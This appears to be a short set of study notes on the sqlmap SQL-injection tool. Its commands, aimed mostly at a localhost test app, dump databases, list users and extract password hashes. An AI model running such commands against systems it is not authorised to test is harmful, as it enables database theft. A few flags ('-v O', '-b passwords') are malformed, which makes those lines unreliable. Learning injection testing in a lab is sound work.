# Learn sqlmap commands:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

```bash
cd sqlmap-dev
```

```bash
python sqlmap.py -h
python sqlmap.py -hh
```

```bash
python sqlmap.py -u https://www.site.com/vuln.php?id=1
python sqlmap.py -u http://localhost:8080/users/search?q=admin
python sqlmap.py -u http://localhost:8080/products
python sqlmap.py -u http://localhost:8080/products?category=Electronics
```

```bash
python sqlmap.py -u http://localhost:8080/products?category=Electronics --dump

python sqlmap.py -u http://localhost:8080/products?category=Electronics -f -b --current-user --current-db --users --passwords --dbs -v O
```

```bash
python sqlmap.py -u http://localhost:8080/products?category=Electronics -b passwords -U CU -v 2
```

```bash
python sqlmap.py -u "http://localhost:8080/auth/login" --data '{"username":"admin","password":"test"}' --batch --level 3
```

```bash
python sqlmap.py -u "http://localhost:8080/users/search?q=admin" --batch --banner

python sqlmap.py -u "http://localhost:8080/users/search?q=admin" --batch --passwords
```
